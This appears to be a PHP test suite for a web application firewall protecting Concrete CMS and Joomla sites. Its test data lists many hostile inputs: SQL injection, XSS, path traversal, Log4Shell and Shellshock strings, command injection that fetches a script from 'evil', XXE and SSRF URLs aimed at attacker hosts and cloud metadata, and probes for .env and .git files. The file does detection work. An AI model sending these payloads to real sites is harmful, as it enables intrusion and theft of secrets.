<?php
// Copyright (c) 2026 Andrii Pasichnyk. All rights reserved. See LICENSE.

declare(strict_types=1);

require __DIR__ . '/bootstrap.php';

use PasichDev\SecurityGuard\Config\Settings;
use PasichDev\SecurityGuard\Rules\ConcreteRoutes;
use PasichDev\SecurityGuard\Rules\Paths;
use PasichDev\SecurityGuard\Rules\RuleSet;
use PasichDev\SecurityGuard\Rules\Signatures;

$rules = new RuleSet(Settings::DEFAULTS);
$chrome = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
$googlebot = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';

// Атаки: URI => очікувана категорія.
$attacks = [
    '/index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon' => 'joomla',
    '/index.php?task=asset.uploadCustomIcon&option=com_sppagebuilder' => 'joomla',
    '/index.php?option=com_jce&task=plugin.rpc' => 'joomla',
    '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form' => 'joomla',
    '/index.php?option=com_rsfiles&task=rsfiles.upload' => 'joomla',
    '/index.php?option=com_gridbox&task=store.register' => 'joomla',
    '/index.php?option=com_ajax&plugin=helix3&format=json' => 'joomla',
    '/index.php?option=com_users&task=user.register' => 'joomla',
    '/index.php?option=com_foo&task=file.upload' => 'joomla',
    '/index.php?OPTION=COM_JCE&TASK=plugin.rpc' => 'joomla',
    '/administrator/index.php' => 'joomla',
    '/administrator/manifests/files/joomla.xml' => 'joomla',
    '/api/index.php/v1/config/application?public=true' => 'joomla',
    '/zwso.php' => 'shells',
    '/XxX.php' => 'shells',
    '/alfa-rex.php' => 'shells',
    '/a1b2c3d4e5.php' => 'shells',
    '/application/files/1234/shell.php' => 'shells',
    '/images/logo.jpg.php' => 'shells',
    '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' => 'shells',
    '/wp-content/themes/pridmag/db.php' => 'wordpress',
    '/wp-content/plugins/' => 'wordpress',
    '/wp-login.php' => 'wordpress',
    '/blog/wp-login.php' => 'wordpress',
    '/xmlrpc.php' => 'wordpress',
    '/wp-admin/' => 'wordpress',
    '/wp-includes/wlwmanifest.xml' => 'wordpress',
    '/wordpress/' => 'wordpress',
    '/?rest_route=/wp/v2/users' => 'wordpress',
    '/.env' => 'secrets',
    '/.env.production' => 'secrets',
    '/laravel/.env' => 'secrets',
    '/.git/config' => 'secrets',
    '/.git/HEAD' => 'secrets',
    '/phpmyadmin/' => 'secrets',
    '/phpMyAdmin/index.php' => 'secrets',
    '/composer.json' => 'secrets',
    '/configuration.php.bak' => 'secrets',
    '/configuration.php~' => 'secrets',
    '/application/config/database.php' => 'secrets',
    '/%2e%2e/%2e%2e/etc/passwd' => 'traversal',
    '/index.php?file=../../etc/passwd' => 'traversal',
    '/index.php?file=..%2f..%2f..%2fetc%2fpasswd' => 'traversal',
    '/index.php?file=%252e%252e%252fetc%252fpasswd' => 'traversal',
    '/novyny?id=1+union+select+1,2,3' => 'injection',
    '/novyny?id=1%20UNION%20ALL%20SELECT%20NULL' => 'injection',
    '/novyny?id=1/**/union/**/select/**/1' => 'injection',
    "/search?q=1' or '1'='1" => 'injection',
    '/search?q=1%27%20OR%201%3D1--' => 'injection',
    '/search?id=1 and sleep(5)' => 'injection',
    '/?x=information_schema.tables' => 'injection',
    '/search?q=<script>alert(1)</script>' => 'xss',
    '/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E' => 'xss',
    '/search?q="><svg/onload=alert(1)>' => 'xss',
    '/?page=php://filter/convert.base64-encode/resource=index' => 'injection',
    '/?cmd=system(\'id\')' => 'injection',
    '/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' => 'injection',
    '/?x=${jndi:ldap://evil/a}' => 'injection',
    '/cgi-bin/luci' => 'scanner',
    '/phpinfo.php' => 'scanner',
];
foreach ($attacks as $uri => $category) {
    $hit = $rules->classifyRequest('GET', $uri, $chrome);
    T::eq($category, $hit['category'] ?? null, 'атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
    T::eq('strong', $hit['strength'] ?? null, 'атака сильна ' . $uri);
}

// Погані User-Agent.
$uas = [
    'sqlmap/1.7.2#stable (https://sqlmap.org)' => 'scanner',
    'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)' => 'scanner',
    'Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)' => 'ai_crawler',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)' => 'ai_crawler',
    'CCBot/2.0 (https://commoncrawl.org/faq/)' => 'ai_crawler',
    '() { :; }; /bin/bash -c "id"' => 'scanner',
    'Mozlila/5.0 (Linux; Android 7.0)' => 'scanner',
];
foreach ($uas as $ua => $category) {
    $hit = $rules->classifyUserAgent($ua);
    T::eq($category, $hit['category'] ?? null, 'UA ' . $ua);
    $hit = $rules->classifyRequest('GET', '/', $ua);
    T::eq($category, $hit['category'] ?? null, 'UA у classifyRequest ' . $ua);
}
// HTTP-бібліотеки — лише якщо ввімкнено (за замовчуванням вимкнено).
T::eq(null, $rules->classifyUserAgent('curl/8.4.0'), 'curl не ловиться за замовчуванням');
$withLibs = new RuleSet(['rules_http_libraries' => true] + Settings::DEFAULTS);
T::eq('HTTP_LIBRARY', $withLibs->classifyUserAgent('curl/8.4.0')['rule'] ?? null, 'curl ловиться з rules_http_libraries');
T::eq('HTTP_LIBRARY', $withLibs->classifyUserAgent('python-requests/2.31.0')['rule'] ?? null, 'python-requests');
T::eq(null, $withLibs->classifyUserAgent($chrome), 'Chrome не HTTP-бібліотека');
// Перемикачі вимикають правила.
$noAi = new RuleSet(['rules_ai_crawlers' => false] + Settings::DEFAULTS);
T::eq(null, $noAi->classifyUserAgent('GPTBot/1.2'), 'AI-краулери вимикаються');
$noJoomla = new RuleSet(['rules_joomla_exploits' => false] + Settings::DEFAULTS);
T::eq(null, $noJoomla->classifyRequest('GET', '/index.php?option=com_jce&task=plugin.rpc', $chrome), 'Joomla-правила вимикаються');

// Легітимний трафік — жодних спрацювань.
$legit = [
    '/',
    '/novyny/some-news',
    '/novyny/vstupna-kampaniya-2026',
    '/' . rawurlencode('новини') . '/' . rawurlencode('день-відкритих-дверей'),
    '/новини/день-відкритих-дверей',
    '/index.php?option=com_content&view=article&id=12',
    '/index.php?option=com_content&view=article&id=12:novyna&catid=8&Itemid=101',
    '/index.php?option=com_content&view=category&layout=blog&id=8&Itemid=115',
    '/index.php?option=com_contact&view=contact&id=1',
    '/index.php?option=com_content&task=article.edit&a_id=5',
    '/index.php/ccm/system/heartbeat',
    '/ccm/system/heartbeat',
    '/index.php/dashboard/sitemap/full',
    '/login',
    '/application/files/1234/5678/document.pdf',
    '/application/files/thumbnails/file_manager_listing/1234/5678/photo.jpg',
    '/application/themes/mytheme/css/theme.css?v=1730800000',
    '/concrete/js/cms.js?ccm_nocache=abc',
    '/search?query=вступ+2026',
    '/search?query=union+of+students',
    '/search?query=select+a+course',
    '/robots.txt',
    '/sitemap.xml',
    '/.well-known/acme-challenge/abc123',
    '/favicon.ico',
    '/pro-koledzh/administratsiya',
    '/pro-koledzh/administration',
    '/abiturientu/rozklad?utm_source=facebook&utm_medium=social&fbclid=IwAR0abc',
    '/novyny?ccm_paging_p=2',
    '/index.php?cID=123',
    '/download_file/1234/567',
];
foreach ($legit as $uri) {
    $hit = $rules->classifyRequest('GET', $uri, $chrome);
    T::eq(null, $hit, 'легітимний ' . $uri);
    $hit = $rules->classifyRequest('GET', $uri, $googlebot);
    T::eq(null, $hit, 'легітимний (Googlebot) ' . $uri);
}
$goodUas = [
    $chrome,
    $googlebot,
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'TelegramBot (like TwitterBot)',
];
foreach ($goodUas as $ua) {
    T::eq(null, $rules->classifyUserAgent($ua), 'нормальний UA ' . $ua);
}

// Тіло POST.
$editorHtml = 'cContent=' . rawurlencode('<p>Текст <script>alert(1)</script> ../../img.png <img src="x" onerror="y"> union select</p>');
// Тіло на службових шляхах тепер вирішує WAF (від тих, хто увійшов, тіло не передається); RuleSet сканує те, що дали.
T::ok($rules->classifyRequest('POST', '/index.php/ccm/system/block/edit/1/Main/1/2', $chrome, $editorHtml) !== null, 'тіло, передане для /ccm, сканується (анонім)');
T::ok($rules->classifyRequest('POST', '/kontakty', $chrome, $editorHtml) !== null, 'той самий HTML у фронтенд-формі ловиться');
T::eq('xss', $rules->classifyRequest('POST', '/kontakty', $chrome, 'message=' . rawurlencode('<script>document.location=1</script>'))['category'] ?? null, 'XSS у тілі фронтенд-форми');
T::eq('injection', $rules->classifyRequest('POST', '/kontakty', $chrome, 'name=a&q=' . rawurlencode("1 UNION SELECT password FROM Users"))['category'] ?? null, 'SQLi у тілі');
T::eq(null, $rules->classifyRequest('POST', '/kontakty', $chrome, 'name=' . rawurlencode('Олена') . '&message=' . rawurlencode('Добрий день! Підкажіть, будь ласка, розклад на 1-й курс. Дякую :)')), 'звичайне повідомлення форми');
T::eq(null, $rules->classifyRequest('POST', '/kontakty', $chrome, 'message=' . rawurlencode('Дивіться ../файл і select або union')), 'один ../ у тілі не атака');
$noBody = new RuleSet(['scan_post_body' => false] + Settings::DEFAULTS);
T::eq(null, $noBody->classifyRequest('POST', '/kontakty', $chrome, $editorHtml), 'scan_post_body=false вимикає тіло');

// --- Concrete CMS ---
$concreteAttacks = [
    '/tools/required/files/importers/remote' => 'concrete',
    '/index.php/tools/required/dashboard/sitemap_data' => 'concrete',
    '/index.php/tools/blocks/form/services' => 'concrete',
    '/concrete/tools/files/search_results.php' => 'concrete',
    '/concrete/src/Application/Application.php' => 'concrete',
    '/concrete/vendor/autoload.php' => 'concrete',
    '/concrete/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' => 'concrete',
    '/concrete/bootstrap/configure.php' => 'concrete',
    '/concrete/config/app.php' => 'concrete',
    '/concrete/controllers/install.php' => 'concrete',
    '/concrete/dispatcher.php' => 'concrete',
    '/concrete/blocks/form/controller.php' => 'concrete',
    '/updates/' => 'concrete',
    '/updates/concrete-cms-9.5.2/concrete/config/concrete.php' => 'concrete',
    '/application/bootstrap/app.php' => 'concrete',
    '/application/src/Foo.php' => 'concrete',
    '/application/controllers/single_page/x.php' => 'concrete',
    '/application/elements/header.php' => 'concrete',
    '/application/themes/mytheme/page_theme.php' => 'concrete',
    '/index.php/install' => 'concrete',
    '/install/' => 'concrete',
    '/index.php/install/setup' => 'concrete',
    '/concrete/composer.json' => 'concrete',
    '/concrete/package.json' => 'concrete',
    '/concrete/LICENSE.TXT' => 'concrete',
    '/concrete/blocks/autonav/README.md' => 'concrete',
    '/readme.md' => 'concrete',
    '/CHANGELOG' => 'concrete',
    '/novyny?x=' . rawurlencode('O:8:"stdClass":1:{s:1:"a";i:1;}') => 'injection',
    '/?data=a:1:{i:0;O:23:"GuzzleHttp\\Psr7\\FnStream":1:{}}' => 'injection',
    '/?xml=' . rawurlencode('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example/x">]>') => 'injection',
    '/?url=http://169.254.169.254/latest/meta-data/' => 'injection',
    '/?feed=http://metadata.google.internal/computeMetadata/v1/' => 'injection',
    '/?u=http://100.100.100.200/latest/meta-data' => 'injection',
    '/?u=http://localhost:8080/admin' => 'injection',
    '/?u=http://127.0.0.1/' => 'injection',
    '/?u=http://[::1]/' => 'injection',
    '/?u=http://0.0.0.0:22' => 'injection',
    '/?u=http://192.168.1.1/' => 'injection',
    '/?u=gopher://evil:25/_x' => 'injection',
    '/?u=dict://127.0.0.1:11211/' => 'injection',
    '/?u=file:///etc/hosts' => 'injection',
];
foreach ($concreteAttacks as $uri => $category) {
    $hit = $rules->classifyRequest('GET', $uri, $chrome);
    T::eq($category, $hit['category'] ?? null, 'Concrete-атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
    T::eq('strong', $hit['strength'] ?? null, 'Concrete-атака сильна ' . $uri);
}
T::eq('PHP_OBJECT_INJECTION', $rules->classifyRequest('POST', '/kontakty', $chrome, 'x=' . rawurlencode('O:40:"Concrete\\Core\\Something":1:{s:1:"a";}'))['rule'] ?? null, 'серіалізований об\'єкт у тілі');
T::eq('XXE', $rules->classifyRequest('POST', '/kontakty', $chrome, '<!DOCTYPE r [<!ENTITY x SYSTEM "http://a/">]><r>&x;</r>')['rule'] ?? null, 'XXE у тілі');
T::eq('PHP_OBJECT_INJECTION', Signatures::classifyCookies("pref=" . rawurlencode('O:8:"stdClass":0:{}') . "\n")['rule'] ?? null, 'серіалізований об\'єкт у cookie');
T::eq(null, Signatures::classifyCookies("_ga=GA1.1.123.456\n_fbp=fb.1.1700000000.123\ncookie_consent=" . rawurlencode('{"necessary":true}') . "\n"), 'звичайні cookie');
$noConcrete = new RuleSet(['rules_concrete' => false] + Settings::DEFAULTS);
T::eq(null, $noConcrete->classifyRequest('GET', '/tools/required/x', $chrome), 'rules_concrete=false вимикає');
$legacySettings = Settings::DEFAULTS;
unset($legacySettings['rules_concrete']);
T::eq('concrete', (new RuleSet($legacySettings))->classifyRequest('GET', '/concrete/composer.json', $chrome)['category'] ?? null, 'rules_concrete без ключа — увімкнено');

$concreteLegit = [
    '/concrete/js/jquery.js',
    '/concrete/js/features/navigation/frontend.js',
    '/concrete/css/features/imagery/frontend.css',
    '/concrete/css/fontawesome/all.css',
    '/concrete/images/logo.svg',
    '/concrete/fonts/x.woff2',
    '/concrete/themes/atomik/css/skins/default.css',
    '/concrete/blocks/image_slider/view.css',
    '/concrete/blocks/image_slider/view.js',
    '/application/themes/mytheme/css/theme.css',
    '/application/themes/mytheme/js/theme.js',
    '/application/themes/mytheme/images/favicon.svg',
    '/application/blocks/news_list/view.css',
    '/application/files/cache/thumbnails/12-den-84202785731dab0ad0900b0f18a218db.jpg',
    '/ccm/assets/localization/core/js',
    '/index.php/ccm/assets/localization/moment/js',
    '/download_file/1234/567',
    '/download_file/view_inline/1234',
    '/rss/novyny',
    '/novyny?url=https://example.org/abiturientu',
    '/search?q=localhost',
    '/search?q=' . rawurlencode('http://169 254'),
    '/tools',
    '/instrumenty/tools-and-installation',
    '/installation-guide',
    '/pro-koledzh/readme-dlya-abituriientiv',
];
foreach ($concreteLegit as $uri) {
    T::eq(null, $rules->classifyRequest('GET', $uri, $chrome), 'Concrete-легітимний ' . $uri);
}

// Службові маршрути для аноніма.
$anonFlag = [
    '/ccm/system/dialogs/page/attributes',
    '/index.php/ccm/system/dialogs/file/properties?fID=1',
    '/ccm/system/panels/sitemap',
    '/ccm/system/backend/intelligent_search/',
    '/ccm/system/file/usage/1',
    '/ccm/system/file/get_json',
    '/ccm/system/file/download?fID=5',
    '/ccm/system/page/sitemap_data',
    '/ccm/system/block/render',
    '/ccm/system/user/autocomplete',
    '/ccm/system/permissions/access/entity',
    '/ccm/system/workflow/categories/page/save_progress',
    '/ccm/system/express/entry/get_json',
    '/ccm/system/board/element/preview/1',
    '/ccm/system/tree/node/load',
    '/ccm/system/attribute/action/x',
    '/ccm/system/messenger/consume',
    '/ccm/system/summary_template/render/page/1/2',
    '/ccm/system/dialogs/conversation/subscribe/1',
    '/ccm/system/search/express/entries/submit/1',
    '/ccm/calendar/dialogs/event/edit',
    '/ccm/calendar/event/get_json',
    '/ccm/system/marketplace/connect',
    '/ccm/system/api/openapi.json',
    '/ccm/system/tasks/execute',
];
foreach ($anonFlag as $uri) {
    T::eq('CONCRETE_BACKEND_ANON', ConcreteRoutes::classifyAnonymous($uri)['rule'] ?? null, 'анонім → службовий ' . $uri);
}
T::eq('CONCRETE_UPGRADE_ANON', ConcreteRoutes::classifyAnonymous('/index.php/ccm/system/upgrade')['rule'] ?? null, 'анонім → upgrade');
T::eq('CONCRETE_UPGRADE_ANON', ConcreteRoutes::classifyAnonymous('/ccm/system/upgrade/submit')['rule'] ?? null, 'анонім → upgrade/submit');
$anonAllow = [
    '/ccm/assets/localization/core/js',
    '/index.php/ccm/assets/localization/select2/js',
    '/ccm/frontend/conversations/view_ajax',
    '/ccm/frontend/conversations/add_message',
    '/ccm/frontend/multilingual/switch_language/1/2',
    '/ccm/system/captcha/picture',
    '/ccm/system/captcha/picture?nocache=123',
    '/ccm/system/css/layout/5',
    '/ccm/system/css/page/1/main/2',
    '/ccm/system/heartbeat',
    '/index.php/ccm/system/heartbeat',
    '/ccm/system/accept_privacy_policy/',
    '/ccm/system/country-data-link/all',
    '/ccm/system/country-stateprovince-link/get_stateprovinces',
    '/ccm/system/jobs?auth=abc',
    '/ccm/system/jobs/run_single',
    '/ccm/calendar/view_event/1/2',
    '/ccm/calendar/feed/1',
    '/ccm/calendar/event/export?eventID=1',
    '/ccm/site/redirect/1',
    '/',
    '/dashboard',
    '/login',
    '/novyny/ccm-not-a-route',
];
foreach ($anonAllow as $uri) {
    T::eq(null, ConcreteRoutes::classifyAnonymous($uri), 'анонім дозволено ' . $uri);
}

// --- Звичайний текст: жодних СИЛЬНИХ збігів (у query і в тілі) ---
$prose = [
    'My operating system (Windows 10) is slow',
    'I need more sleep (8 hours)',
    'I love you <3 and online=yes',
    'operating system (linux)',
    'linux; cat command',
    'Давайте об\'єднаємо (union) і виберемо (select) найкраще',
    'Формула a<b, b>c і 2<3>1',
    'Чи можна eval (оцінку) отримати пізніше?',
    'Підкажіть, будь ласка, розклад :) <3 ;-)',
    'Відповідь: "SELECT * FROM table" — це SQL-запит з лекції',
    'The system (as a whole) works; include (optional) notes',
    'Ціна 100$ (сто доларів); знижка 5%',
    'Код у лапках: "<b>жирний</b>" і \'<i>\'',
    'email: test@example.com, сайт http://example.org/novyny',
    'Посилання http://localhost не працює у мене на ноутбуці',
    'Зустрінемося o:8 годині',
    "It's raining or snowing = cold",
    '../ означає батьківську теку',
];
foreach ($prose as $text) {
    $hq = $rules->classifyRequest('GET', '/search?q=' . rawurlencode($text), $chrome);
    T::ok($hq === null || $hq['strength'] === 'weak', 'текст у пошуку не сильна атака: ' . $text . ' (' . ($hq['rule'] ?? '-') . ')');
    $hb = $rules->classifyRequest('POST', '/kontakty', $chrome, 'message=' . rawurlencode($text));
    T::ok($hb === null || $hb['strength'] === 'weak', 'текст у формі не сильна атака: ' . $text . ' (' . ($hb['rule'] ?? '-') . ')');
}
// Слабкі ознаки — повертаються як weak.
T::eq('weak', $rules->classifyRequest('POST', '/kontakty', $chrome, 'm=' . rawurlencode('<script>alert(1)</script>'))['strength'] ?? null, '<script> у тілі форми — weak');
T::eq('weak', $rules->classifyRequest('GET', '/search?q=' . rawurlencode('union select'), $chrome)['strength'] ?? null, 'union select без SQL-синтаксису — weak');
T::eq('weak', $rules->classifyRequest('GET', '/search?q=' . rawurlencode('javascript: basics'), $chrome)['strength'] ?? null, 'javascript: у пошуку — weak');
// Справжній синтаксис — strong.
foreach ([
    "/?q=1' AND SLEEP(5)-- -",
    '/?q=1) or sleep(5)#',
    "/?id=1';WAITFOR DELAY '0:0:5'--",
    "/?f=system('id')",
    '/?f=eval($_POST[x])',
    '/?f=phpinfo()',
    '/?f=base64_decode("ZWNobyAx")',
    '/?h=' . rawurlencode('<svg/onload=alert(1)>'),
    '/?c=' . rawurlencode('1;cat /etc/hosts'),
    '/?c=' . rawurlencode('x|whoami'),
    '/?c=' . rawurlencode('$(wget http://evil/x.sh)'),
    '/?id=-1/*!50000union*/ /*!50000select*/ 1,2,3',
] as $uri) {
    $hit = $rules->classifyRequest('GET', $uri, $chrome);
    T::eq('strong', $hit['strength'] ?? null, 'сильна атака ' . $uri . ' (' . ($hit['rule'] ?? '-') . ')');
}
// Сегменти шляху.
T::eq('SQL_UNION', $rules->classifyRequest('GET', '/news/1%27%20union%20select%201,2', $chrome)['rule'] ?? null, 'SQLi у сегменті шляху');
T::eq('XSS_HANDLER', $rules->classifyRequest('GET', '/novyny/%3Cimg%20src=x%20onerror=alert(1)%3E', $chrome)['rule'] ?? null, 'XSS у сегменті шляху');
foreach (['/novyny/den-vidkrytykh-dverei-2026', '/pro-koledzh/system-of-education', "/novyny/o'brien-lecture", '/novyny/(archive)', '/novyny/sleep-hygiene-8-hours'] as $uri) {
    T::eq(null, $rules->classifyRequest('GET', $uri, $chrome), 'слаг не атака: ' . $uri);
}
// JSON-екранування в тілі.
T::eq('XSS_HANDLER', $rules->classifyRequest('POST', '/api', $chrome, '{"html":"\\u003cimg src=x onerror=alert(1)\\u003e"}')['rule'] ?? null, 'JSON \\u003c… розкривається');
T::eq('PHP_OBJECT_INJECTION', $rules->classifyRequest('PUT', '/api', $chrome, '{"d":"O:8:\\"stdClass\\":0:{}"}')['rule'] ?? null, 'PUT-тіло JSON зі серіалізованим об\'єктом');

// --- Стійкість до ReDoS: без PCRE JIT, великі ворожі входи ---
ini_set('pcre.jit', '0');
$slow = new RuleSet(Settings::DEFAULTS);
$adversarial = [
    'body /*a /*a…' => str_repeat('/*a', 21000),
    'body <a <a…' => str_repeat('<a ', 21000),
    'body http://a…' => str_repeat('http://aaaaaaa', 4500),
    "body ' or …" => str_repeat("' or ", 13000),
    'body union( …' => 'union' . str_repeat('(', 60000),
    'body ;;;…' => str_repeat('; ', 30000),
    'body O:1:"…' => str_repeat('O:1:"', 13000),
    'body ../…' => str_repeat('..', 30000),
    'body sleep(…' => str_repeat('and sleep(', 6000),
    'body <!doctype…' => '<!doctype ' . str_repeat('a', 60000),
];
foreach ($adversarial as $label => $payload) {
    $t0 = microtime(true);
    $slow->classifyRequest('POST', '/kontakty', $chrome, $payload);
    $slow->classifyRequest('GET', '/?q=' . substr($payload, 0, 8000), $chrome);
    $ms = (microtime(true) - $t0) * 1000;
    T::ok($ms < 1000, sprintf('ReDoS %s: %.0f мс (без JIT)', $label, $ms));
}
// SQL-коментарі вирізаються лінійно; незакритий коментар не ховає решту.
T::eq('strong', $rules->classifyRequest('GET', '/?id=1 union/**/select/**/1,2', $chrome)['strength'] ?? null, 'union/**/select');
T::ok($rules->classifyRequest('GET', '/?id=' . rawurlencode('/* x ' . "' or 1=1-- "), $chrome) !== null, 'незакритий коментар не ховає атаку');
ini_set('pcre.jit', '1');

// --- Адреси без секрету аварійного обходу ---
use PasichDev\SecurityGuard\Waf\Text;
T::eq('/novyny?page=2', Text::cleanUrl('/novyny?sg_pass=SECRET&page=2'), 'cleanUrl: прибирає sg_pass');
T::eq('/', Text::cleanUrl('/?sg_pass=SECRET'), 'cleanUrl: лише sg_pass');
T::eq('/a?x=1', Text::cleanUrl('/a?x=1&SG_PASS=S&sg%5Fpass=S&sg.pass=S&sg+pass=S&sg_pass[]=S'), 'cleanUrl: усі написання');
T::eq('/a?x=1#f', Text::cleanUrl('/a?x=1&sg_pass=S#f'), 'cleanUrl: фрагмент лишається');
T::eq('/a?sg_passport=1', Text::cleanUrl('/a?sg_passport=1'), 'cleanUrl: інший параметр (sg_passport) лишається');

// Honeypot.
T::ok($rules->isHoneypot('/wp-login.php'), 'honeypot /wp-login.php');
T::ok($rules->isHoneypot('/phpmyadmin/'), 'honeypot /phpmyadmin/');
T::ok($rules->isHoneypot('/phpmyadmin/index.php'), 'honeypot усередині теки');
T::ok($rules->isHoneypot('/PhpMyAdmin'), 'honeypot без слеша й у іншому регістрі');
T::ok($rules->isHoneypot('/.env'), 'honeypot /.env');
T::ok($rules->isHoneypot('/.git/config'), 'honeypot /.git/config');
T::ok($rules->isHoneypot('/installation/index.php'), 'honeypot /installation/');
T::ok($rules->isHoneypot('/blog/wp-login.php?x=1'), 'honeypot останній сегмент + query');
T::ok(!$rules->isHoneypot('/installation-guide'), 'не honeypot: /installation-guide');
T::ok(!$rules->isHoneypot('/xwp-login.php'), 'не honeypot: /xwp-login.php');
T::ok(!$rules->isHoneypot('/login'), 'не honeypot: /login');
T::ok(!$rules->isHoneypot('/'), 'не honeypot: /');
T::ok(!$rules->isHoneypot('/novyny/admin'), 'не honeypot: /novyny/admin');
T::ok($rules->isHoneypot('/secret-trap', ['/secret-trap']), 'власна пастка');
T::ok(!$rules->isHoneypot('/secret-trap-2', ['/secret-trap']), 'власна пастка — межа сегмента');

// Службові шляхи.
T::ok(Paths::isTrusted('/dashboard'), 'trusted /dashboard');
T::ok(Paths::isTrusted('/index.php/dashboard/system'), 'trusted /index.php/dashboard');
T::ok(Paths::isTrusted('/ccm/system/heartbeat'), 'trusted /ccm');
T::ok(Paths::isTrusted('/index.php/ccm/system/heartbeat'), 'trusted /index.php/ccm');
T::ok(Paths::isTrusted('/login/authenticate/concrete'), 'trusted /login');
T::ok(!Paths::isTrusted('/dashboards'), 'не trusted /dashboards');
T::ok(!Paths::isTrusted('/novyny/login'), 'не trusted /novyny/login');
T::ok(Paths::isLoginAuthenticate('/login/authenticate/concrete'), 'шлях входу');
T::ok(Paths::isLoginAuthenticate('/index.php/login/authenticate/concrete/'), 'шлях входу з index.php');
T::ok(!Paths::isLoginAuthenticate('/login'), 'сторінка входу — не POST-маршрут');

// Статика.
T::ok(RuleSet::isStaticPath('/application/themes/mytheme/css/theme.css'), 'static css');
T::ok(!RuleSet::isStaticPath('/novyny'), 'not static');

// Продуктивність: 2000 класифікацій мають іти швидко.
$t = microtime(true);
for ($i = 0; $i < 2000; $i++) {
    $rules->classifyRequest('GET', '/novyny/some-news?utm_source=x&page=' . $i, $chrome);
}
$ms = (microtime(true) - $t) * 1000;
T::ok($ms < 1500, sprintf('2000 класифікацій за %.0f мс', $ms));
echo sprintf("  (2000 класифікацій: %.0f мс)\n", $ms);

T::done('rules_test');
